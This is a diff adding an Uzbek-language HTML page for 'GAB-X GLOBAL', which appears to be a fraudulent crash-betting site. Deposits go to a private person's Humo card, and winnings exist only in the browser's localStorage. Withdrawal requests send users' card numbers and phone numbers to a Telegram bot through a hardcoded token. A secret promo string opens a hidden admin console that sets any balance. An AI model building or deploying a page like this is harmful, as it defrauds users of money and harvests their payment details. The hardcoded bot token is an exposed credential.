@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GAB-X GLOBAL // THE SOVEREIGN SYSTEM</title>
+    <style>
+        /* 🎨 GLOBAL KIBERPANK STILISTIKASI */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg-dark: #020409;
+            --panel-bg: rgba(9, 14, 32, 0.85);
+            --neon-blue: #00d2ff;
+            --neon-green: #00ff66;
+            --neon-pulse: #ff0055;
+            --neon-amber: #ffaa00;
+            --text-light: #ffffff;
+            --text-muted: #7a8ebf;
+            --border-glow: rgba(0, 212, 255, 0.25);
+        }
+        
+        body {
+            width: 100%;
+            min-height: 100vh;
+            background-color: var(--bg-dark);
+            font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
+            color: var(--text-light);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 210, 255, 0.08) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(255, 0, 85, 0.05) 0%, transparent 40%),
+                radial-gradient(circle at center, #060b1e 0%, #020409 100%);
+            background-attachment: fixed;
+        }
+
+        .global-wrapper {
+            width: 100%;
+            max-width: 540px;
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+
+        .core-interface {
+            width: 100%;
+            background: var(--panel-bg);
+            border: 2px solid rgba(0, 210, 255, 0.4);
+            border-radius: 32px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 0 60px rgba(0, 212, 255, 0.2);
+            position: relative;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+        }
+
+        .brand-header {
+            margin-bottom: 20px;
+        }
+        .brand-header h1 {
+            font-size: 26px;
+            font-weight: 900;
+            letter-spacing: 3px;
+            background: linear-gradient(90deg, #fff, var(--neon-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px rgba(0, 210, 255, 0.3);
+        }
+        .brand-subtitle {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--neon-blue);
+            margin-top: 4px;
+            font-weight: bold;
+        }
+
+        .identity-badge {
+            display: flex;
+            justify-content: space-between;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 12px 16px;
+            border-radius: 14px;
+            border: 1px solid rgba(0,210,255,0.2);
+            font-family: monospace;
+            font-size: 13px;
+            margin-bottom: 20px;
+            align-items: center;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+        }
+        .identity-badge input {
+            background: #000;
+            border: 1px solid var(--neon-blue);
+            color: #fff;
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-family: monospace;
+            outline: none;
+            font-size: 13px;
+            width: 65%;
+            box-shadow: 0 0 10px rgba(0, 210, 255, 0.1);
+        }
+        .identity-badge button {
+            background: linear-gradient(90deg, var(--neon-blue), #0088ff);
+            color: #000;
+            border: none;
+            padding: 7px 16px;
+            border-radius: 8px;
+            font-weight: 900;
+            cursor: pointer;
+            font-size: 12px;
+            transition: 0.2s;
+        }
+        .identity-badge button:hover {
+            box-shadow: 0 0 15px var(--neon-blue);
+            transform: scale(1.02);
+        }
+
+        .vault-display {
+            background: linear-gradient(135deg, rgba(0,0,0,0.7) 0%, rgba(5,10,25,0.8) 100%);
+            border: 1px solid rgba(0, 210, 255, 0.3);
+            padding: 22px;
+            border-radius: 22px;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        .vault-display::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 2px;
+            background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
+        }
+        .vault-title {
+            font-size: 10px;
+            color: var(--text-muted);
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+        .vault-value {
+            font-size: 34px;
+            font-weight: 900;
+            color: var(--neon-green);
+            font-family: monospace;
+            text-shadow: 0 0 20px rgba(0,255,102,0.3);
+            margin: 8px 0;
+        }
+        .vault-actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 15px;
+        }
+        .vault-actions button {
+            flex: 1;
+            padding: 10px;
+            font-size: 11px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .btn-depozit {
+            background: rgba(0, 210, 255, 0.08);
+            border: 1px solid rgba(0, 210, 255, 0.4);
+            color: #fff;
+        }
+        .btn-depozit:hover {
+            background: var(--neon-blue);
+            color: #000;
+            box-shadow: 0 0 15px rgba(0, 210, 255, 0.4);
+        }
+        .btn-vivod {
+            background: rgba(255, 0, 85, 0.08);
+            border: 1px solid rgba(255, 0, 85, 0.4);
+            color: #fff;
+        }
+        .btn-vivod:hover {
+            background: var(--neon-pulse);
+            color: #fff;
+            box-shadow: 0 0 15px rgba(255, 0, 85, 0.4);
+        }
+
+        .oscilloscope-screen {
+            width: 100%;
+            height: 230px;
+            background: #000104;
+            border-radius: 20px;
+            margin: 20px 0;
+            position: relative;
+            border: 1px solid rgba(0, 255, 102, 0.25);
+            overflow: hidden;
+            box-shadow: inset 0 0 30px rgba(0, 255, 102, 0.15);
+        }
+        .grid-overlay {
+            position: absolute; width: 100%; height: 100%;
+            background-image: linear-gradient(rgba(0, 255, 102, 0.04) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(0, 255, 102, 0.04) 1px, transparent 1px);
+            background-size: 25px 25px; pointer-events: none;
+        }
+        .live-multiplier {
+            position: absolute; top: 38%; left: 0; width: 100%;
+            text-align: center; font-size: 44px; font-weight: 900;
+            color: #ffffff; font-family: monospace;
+            text-shadow: 0 0 25px rgba(0,0,0,0.9); pointer-events: none;
+            letter-spacing: -1px;
+        }
+
+        .telemetry-input {
+            background: rgba(0,0,0,0.4);
+            padding: 18px;
+            border-radius: 18px;
+            border: 1px solid rgba(255,255,255,0.04);
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .telemetry-input label {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            display: block;
+            margin-bottom: 6px;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+        }
+        .telemetry-input input[type="number"] {
+            width: 100%;
+            padding: 11px;
+            background: #000;
+            border: 1px solid rgba(0, 210, 255, 0.3);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 15px;
+            font-family: monospace;
+            outline: none;
+            margin-bottom: 12px;
+        }
+
+        .trigger-action-btn {
+            width: 100%;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            border-radius: 16px;
+            border: none;
+            cursor: pointer;
+            background: linear-gradient(90deg, var(--neon-blue), #0055ff);
+            color: #fff;
+            transition: 0.3s;
+            box-shadow: 0 5px 25px rgba(0, 102, 255, 0.35);
+        }
+        .trigger-action-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 102, 255, 0.55);
+        }
+
+        .gateway-promo-input {
+            margin-top: 20px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.08);
+            background: #000;
+            padding: 10px;
+            border-radius: 10px;
+            color: #fff;
+            outline: none;
+            font-family: monospace;
+            width: 100%;
+            font-size: 13px;
+        }
+
+        /* 📑 INFRATUZILMA VA "TEZ KUNDA" MODULLARI */
+        .expansion-panel {
+            width: 100%;
+            background: var(--panel-bg);
+            border: 1px solid rgba(0, 210, 255, 0.2);
+            border-radius: 28px;
+            padding: 25px;
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+        }
+        .expansion-title {
+            font-size: 14px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--neon-amber);
+            margin-bottom: 15px;
+            text-align: left;
+            border-left: 4px solid var(--neon-amber);
+            padding-left: 10px;
+        }
+        .feature-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .feature-item {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.03);
+            border-radius: 14px;
+            padding: 15px;
+            text-align: left;
+            position: relative;
+            transition: 0.2s;
+        }
+        .feature-item:hover {
+            border-color: rgba(255, 170, 0, 0.3);
+            background: rgba(5,5,15,0.6);
+        }
+        .feature-status {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 9px;
+            font-weight: 900;
+            background: rgba(255, 170, 0, 0.15);
+            color: var(--neon-amber);
+            padding: 3px 8px;
+            border-radius: 6px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        .feature-name {
+            font-size: 14px;
+            font-weight: bold;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        .feature-desc {
+            font-size: 11px;
+            color: var(--text-muted);
+            line-height: 1.4;
+        }
+
+        /* 📈 STRATEGIK MANIFEST VA YO'L XARITASI */
+        .manifesto-panel {
+            width: 100%;
+            background: var(--panel-bg);
+            border: 1px solid rgba(0, 255, 102, 0.2);
+            border-radius: 28px;
+            padding: 25px;
+            text-align: left;
+        }
+        .manifesto-title {
+            font-size: 14px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--neon-green);
+            margin-bottom: 15px;
+            border-left: 4px solid var(--neon-green);
+            padding-left: 10px;
+        }
+        .manifesto-text {
+            font-size: 12px;
+            color: #cbd5e1;
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+        .manifesto-list {
+            margin-left: 15px;
+            margin-top: 8px;
+            font-size: 12px;
+            color: var(--text-muted);
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .manifesto-list li b { color: #fff; }
+
+        /* 🛠️ SECRET CEO TERMINAL SYSTEM */
+        .ceo-terminal {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #010205;
+            border: 2px solid var(--neon-pulse);
+            z-index: 9999;
+            padding: 25px;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: left;
+            border-radius: 32px;
+            box-shadow: 0 0 50px rgba(255, 0, 85, 0.3);
+        }
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--neon-pulse);
+            padding-bottom: 8px;
+            margin-bottom: 15px;
+        }
+        .terminal-title { color: var(--neon-pulse); font-weight: bold; font-size: 13px; }
+        .terminal-close { color: #ff3333; cursor: pointer; font-weight: bold; font-size: 14px; }
+        .terminal-log {
+            height: 78%;
+            overflow-y: auto;
+            font-size: 11px;
+            color: #a8a29e;
+            white-space: pre-wrap;
+            line-height: 1.5;
+        }
+        .terminal-input-row {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 10px;
+        }
+        .terminal-prompt { color: var(--neon-green); font-weight: bold; margin-right: 8px; }
+        .terminal-cmd-field {
+            flex: 1; background: transparent; border: none; color: #fff;
+            font-family: monospace; outline: none; font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="global-wrapper">
+
+    <div class="core-interface">
+        
+        <div class="brand-header">
+            <h1>GAB-X GLOBAL</h1>
+            <div class="brand-subtitle">Quantum Pulse Core v1.9</div>
+        </div>
+
+        <div class="identity-badge" id="authGate">
+            <input type="text" id="phoneBox" placeholder="Telefon (998XXXXXXXXX)">
+            <button onclick="connectSession()">LOG IN</button>
+        </div>
+        <div class="identity-badge" id="sessionActiveGate" style="display:none;">
+            <span>CORE ID: <b id="sessionPhone" style="color:var(--neon-blue);">...</b></span>
+            <button onclick="terminateSession()" style="background:none; border:none; color:var(--neon-pulse); cursor:pointer; font-weight:bold; font-size:11px;">DISCONNECT</button>
+        </div>
+
+        <div class="vault-display">
+            <div class="vault-title">GAB-X QUANTUM CORE LIQUIDITY</div>
+            <div class="vault-value"><span id="liveVaultBal">0</span> UZS</div>
+            <div class="vault-actions">
+                <button class="btn-depozit" onclick="alert('💳 HUMO KARTA: 9860 3501 4229 7281\n👤 EGA: Dilnoza Juraboeva\n\nMablag\'ni o\'tkazib, chekni tasdiqlash uchun adminga yuboring.')">➕ DEPOZIT</button>
+                <button class="btn-vivod" onclick="requestPayout()">➖ VIVOD</button>
+            </div>
+        </div>
+
+        <div id="coreStatus" style="font-size:12px; font-weight:bold; color:var(--neon-blue); margin-bottom:12px; text-transform:uppercase; letter-spacing:0.5px;">Tizim Barqaror // Signal Kutilmoqda</div>
+
+        <div class="oscilloscope-screen">
+            <div class="grid-overlay"></div>
+            <canvas id="pulseCanvas" style="position:absolute; top:0; left:0; width:100%; height:100%;"></canvas>
+            <div id="liveMultiplier" class="live-multiplier">1.00x</div>
+        </div>
+
+        <div class="telemetry-input">
+            <label>Kvant chastotasi (Xavf darajasi 1-5):</label>
+            <input type="number" id="pulseRisk" min="1" max="5" value="2">
+            <label style="margin-top: 10px;">Tikish energetikasi (UZS):</label>
+            <input type="number" id="pulseBet" min="1000" value="5000">
+        </div>
+
+        <button class="trigger-action-btn" id="coreTriggerBtn" onclick="togglePulseEngine()">PULSE SIGNALINI YUBORISH</button>
+
+        <input type="text" id="gatewayPromo" class="gateway-promo-input" placeholder="Tizim boshqaruv kaliti / Promokod..." onkeydown="if(event.key==='Enter') executePromoEvaluator()">
+
+        <div class="ceo-terminal" id="ceoTerminalPanel">
+            <div class="terminal-header">
+                <span class="terminal-title">GAB-X MASTER CONTROL TERMINAL v1.9</span>
+                <span class="terminal-close" onclick="document.getElementById('ceoTerminalPanel').style.display='none'">[X]</span>
+            </div>
+            <div id="terminalConsoleLog" class="terminal-log"></div>
+            <div class="terminal-input-row">
+                <span class="terminal-prompt">GABX_CEO_SYS_#</span>
+                <input type="text" id="terminalCmdInput" class="terminal-cmd-field" placeholder="help yoki set_balance [tel] [summa]" onkeydown="if(event.key==='Enter') processTerminalCommand()">
+            </div>
+        </div>
+    </div>
+
+    <div class="expansion-panel">
+        <div class="expansion-title">Ekotizim Infratuzilmasi (Tez Kunda)</div>
+        <div class="feature-grid">
+            <div class="feature-item">
+                <div class="feature-status">Development</div>
+                <div class="feature-name">💥 GAB-X GRAPH (Pathfinder)</div>
+                <div class="feature-desc">Mines falsafasidan butunlay farqli, $5 \times 5$ Kvant tarmoqlari va tugunlari bo'ylab yo'l tanlashga asoslangan intellektual algoritmik o'yin.</div>
+            </div>
+            <div class="feature-item">
+                <div class="feature-status">Planning</div>
+                <div class="feature-name">🤖 SMM Automated Boost Panel</div>
+                <div class="feature-desc">Telegram va Instagram kanallari uchun faollik, ko'rishlar soni va avtomatlashtirilgan nakrutka modullarining ekotizim ichki xizmati.</div>
+            </div>
+            <div class="feature-item">
+                <div class="feature-status">Next Stage</div>
+                <div class="feature-name">📱 GabXCore Native App</div>
+                <div class="feature-desc">Python Flet texnologiyasi asosida kros-platformali mobil ilova (Android / iOS) korpusi.</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="manifesto-panel">
+        <div class="manifesto-title">GAB-X GLOBAL Manifesti va Yo'l Xaritasi</div>
+        <div class="manifesto-text">
+            Biz platformalarning cheklovlaridan ozod, har bir foydalanuvchining o'z reaksiyasi va kognitiv qobiliyati evaziga barqaror natijaga erisha oladigan mukammal muhitni quryapmiz.
+        </div>
+        <ul class="manifesto-list">
+            <li>• <b>Bosqich 1:</b> Serverless tizimni GitHub ekotizimiga (`gabxglobal.github.io`) muvaffaqiyatli o'tkazish.</li>
+            <li>• <b>Bosqich 2:</b> Kelajakda qishloq hududida <b>50 ta yuqori quvvatli shaxsiy kompyuter</b> hamda 10 ta PlayStation konsolidan tashkil topgan GAB-X Gaming Center kiber klubini ochish.</li>
+            <li>• <b>Bosqich 3:</b> Ilg'or matematik hisob-kitoblar, jumladan $P \approx NP$ konseptual va Fully Polynomial-Time Approximation Schemes (FPTAS) tizimini o'yin harakatlariga joriy etish.</li>
+        </ul>
+    </div>
+
+</div>
+
+<script>
+    /* 🧠 ADVANCED JAVASCRIPT LOGIC CORE */
+    const BOT_TOKEN = "8786940598:AAG7UI3xE0NsU4BnU9lG0P2WxerPjf3M1hs";
+    const CHAT_ID = "847670656";
+
+    let phone = ""; let balance = 0; let isEngineRunning = false;
+    let canvas, ctx, animationFrameId;
+    let currentX = 0; let pulseMultiplier = 1.00; let crashPoint = 0;
+    let betAmount = 0; let riskModifier = 2;
+    let wavePoints = [];
+
+    window.onload = function() {
+        canvas = document.getElementById('pulseCanvas'); ctx = canvas.getContext('2d');
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+        let saved = localStorage.getItem('gabx_pulse_phone');
+        if(saved) { phone = saved; initPulseSession(); }
+        drawStaticLine();
+        bootTerminalLog();
+    };
+
+    function resizeCanvas() { 
+        canvas.width = canvas.clientWidth; canvas.height = canvas.clientHeight; 
+        if(!isEngineRunning) drawStaticLine(); 
+    }
+
+    function connectSession() {
+        let p = document.getElementById('phoneBox').value.trim().replace(/[^0-9]/g, '');
+        if(p.length < 9) { alert("Raqam formati noto'g'ri!"); return; }
+        phone = p; localStorage.setItem('gabx_pulse_phone', phone);
+        initPulseSession();
+    }
+    
+    function initPulseSession() {
+        document.getElementById('authGate').style.display = 'none';
+        document.getElementById('sessionActiveGate').style.display = 'flex';
+        document.getElementById('sessionPhone').innerText = "+" + phone;
+        balance = parseInt(localStorage.getItem(`gabx_pbal_${phone}`)) || 0;
+        updateVaultUI();
+    }
+    
+    function terminateSession() { localStorage.removeItem('gabx_pulse_phone'); location.reload(); }
+    function updateVaultUI() { document.getElementById('liveVaultBal').innerText = balance.toLocaleString(); localStorage.setItem(`gabx_pbal_${phone}`, balance); }
+
+    function drawStaticLine() {
+        ctx.clearRect(0,0,canvas.width,canvas.height); 
+        ctx.strokeStyle = "rgba(0, 210, 255, 0.3)";
+        ctx.lineWidth = 2; ctx.beginPath(); 
+        ctx.moveTo(0, canvas.height/2); ctx.lineTo(canvas.width, canvas.height/2); 
+        ctx.stroke();
+    }
+
+    function togglePulseEngine() {
+        if(isEngineRunning) { stabilizePulsePayout(); return; }
+        if(!phone) { alert("Iltimos, avval tizimga autentifikatsiya qiling!"); return; }
+        betAmount = parseInt(document.getElementById('pulseBet').value) || 0;
+        riskModifier = parseInt(document.getElementById('pulseRisk').value) || 2;
+
+        if(betAmount > balance) { alert("Balansda mablag' yetarli emas!"); return; }
+        if(betAmount < 1000) { alert("Minimal energiya (tikish): 1,000 UZS"); return; }
+
+        balance -= betAmount; updateVaultUI();
+        isEngineRunning = true; currentX = 0; pulseMultiplier = 1.00; wavePoints = [];
+        
+        let rand = Math.random();
+        if (rand < 0.06) crashPoint = 1.01;
+        else crashPoint = 1.01 + Math.pow(Math.random(), riskModifier) * 12;
+
+        document.getElementById('coreStatus').innerText = "SIGNAL REZONANSI HARAKATLANMOQDA...";
+        document.getElementById('coreTriggerBtn').innerText = "STABILIZE (1.00x)";
+        document.getElementById('coreTriggerBtn').style.background = "linear-gradient(90deg, var(--neon-green), #00aa44)";
+
+        runPulseLoop();
+    }
+
+    function runPulseLoop() {
+        if(!isEngineRunning) return;
+        currentX += 2.5;
+        pulseMultiplier += 0.012 * (currentX / 45);
+
+        document.getElementById('liveMultiplier').innerText = pulseMultiplier.toFixed(2) + "x";
+        document.getElementById('coreTriggerBtn').innerText = `STABILIZE (${Math.floor(betAmount * pulseMultiplier).toLocaleString()} UZS)`;
+
+        if(pulseMultiplier >= crashPoint) {
+            isEngineRunning = false; cancelAnimationFrame(animationFrameId);
+            document.getElementById('liveMultiplier').innerText = "CRITICAL FAILURE";
+            document.getElementById('liveMultiplier').style.color = "var(--neon-pulse)";
+            document.getElementById('coreStatus').innerText = "KVANT INQIROZI! REZONANS SINDI.";
+            resetActionBtn();
+            return;
+        }
+
+        ctx.clearRect(0,0,canvas.width,canvas.height);
+        let y = canvas.height / 2 + Math.sin(currentX * 0.06) * (currentX * 0.22);
+        wavePoints.push({x: currentX % canvas.width, y: y});
+        if(wavePoints.length > canvas.width) wavePoints.shift();
+
+        ctx.strokeStyle = "var(--neon-blue)"; ctx.lineWidth = 3; ctx.beginPath();
+        for(let i=0; i<wavePoints.length; i++) {
+            if(i===0) ctx.moveTo(wavePoints[i].x, wavePoints[i].y);
+            else ctx.lineTo(wavePoints[i].x, wavePoints[i].y);
+        }
+        ctx.stroke();
+
+        animationFrameId = requestAnimationFrame(runPulseLoop);
+    }
+
+    function stabilizePulsePayout() {
+        if(!isEngineRunning) return;
+        isEngineRunning = false; cancelAnimationFrame(animationFrameId);
+        let winnings = Math.floor(betAmount * pulseMultiplier);
+        balance += winnings; updateVaultUI();
+        document.getElementById('coreStatus').innerText = `SIGNAL MUVAFFAQIYATLI USHLANDI: +${winnings.toLocaleString()} UZS!`;
+        resetActionBtn();
+    }
+
+    function resetActionBtn() {
+        document.getElementById('coreTriggerBtn').innerText = "PULSE SIGNALINI YUBORISH";
+        document.getElementById('coreTriggerBtn').style.background = "linear-gradient(90deg, var(--neon-blue), #0066ff)";
+        document.getElementById('liveMultiplier').style.color = "#fff";
+    }
+
+    function requestPayout() {
+        let card = prompt("Mablag' chiqariladigan Humo/Uzcard karta raqami:"); 
+        let sum = prompt("Chiqariladigan summa (UZS):");
+        if(!card || !sum || parseInt(sum) > balance || parseInt(sum) < 1000) { alert("Xatolik!"); return; }
+        balance -= parseInt(sum); updateVaultUI();
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: `🚨 [QUANTUM PULSE VIVOD SO'ROVI]\nTel: +${phone}\nKarta: ${card}\nSumma: ${sum} UZS` })
+        });
+        alert("Sizning chiqim arizangiz GAB-X yadrosiga yuborildi!");
+    }
+
+    function executePromoEvaluator() {
+        let val = document.getElementById('gatewayPromo').value.trim();
+        if(val === 'Abubakir_CEO console') {
+            document.getElementById('ceoTerminalPanel').style.display = 'block';
+            document.getElementById('terminalCmdInput').focus();
+            document.getElementById('gatewayPromo').value = "";
+        } else if(val !== "") { 
+            alert("Noma'lum boshqaruv buyrug'i!"); 
+            document.getElementById('gatewayPromo').value = ""; 
+        }
+    }
+
+    function bootTerminalLog() {
+        let log = document.getElementById('terminalConsoleLog');
+        log.innerHTML = `INITIALIZING GAB-X SOVEREIGN KERNEL...\nBOOT SECTOR: SUCCESSFUL\nLOCAL_BALANCE_STORAGE: LOADED\nP2P_TG_PIPELINE: ACTIVE\nWELCOME MASTER ABUBAKIR. SYSTEM IS READY FOR OVERRIDES.\n\nYozing: 'set_balance [telefon] [summa]' yoki 'clear'`;
+    }
+
+    function processTerminalCommand() {
+        let input = document.getElementById('terminalCmdInput'); let line = input.value.trim(); input.value = "";
+        let log = document.getElementById('terminalConsoleLog'); if(!line) return;
+        
+        log.innerHTML += `\n\nGABX_CEO_SYS_# ${line}`;
+        let args = line.split(" ");
+        let cmd = args[0].toLowerCase();
+        
+        if(cmd === 'help') {
+            log.innerHTML += `\nBuyruqlar:\n  help - Ushbu menyu\n  set_balance [tel] [summa] - Balansni majburiy o'zgartirish\n  clear - Konsolni tozalash`;
+        } else if(cmd === 'clear') {
+            log.innerHTML = "TERMINAL TOZALANDI. READY.";
+        } else if(cmd === 'set_balance') {
+            let targetPhone = args[1]; let targetSum = parseInt(args[2]);
+            if(!targetPhone || isNaN(targetSum)) {
+                log.innerHTML += `\n<span style="color:#ff3333">XATO: Parametrlar noto'g'ri. Sintaksis: set_balance 998941701204 500000</span>`;
+                return;
+            }
+            if(targetPhone === phone) { balance = targetSum; updateVaultUI(); } 
+            else { localStorage.setItem(`gabx_pbal_${targetPhone}`, targetSum); }
+            log.innerHTML += `\n<span style="color:var(--neon-green)">SUCCESS: +${targetPhone} balansi ${targetSum.toLocaleString()} UZS ga sozlandi.</span>`;
+        } else {
+            log.innerHTML += `\n<span style="color:#ff3333">COMMAND NOT FOUND: '${cmd}'</span>`;
+        }
+        log.scrollTop = log.scrollHeight;
+    }
+</script>
+</body>
+</html>
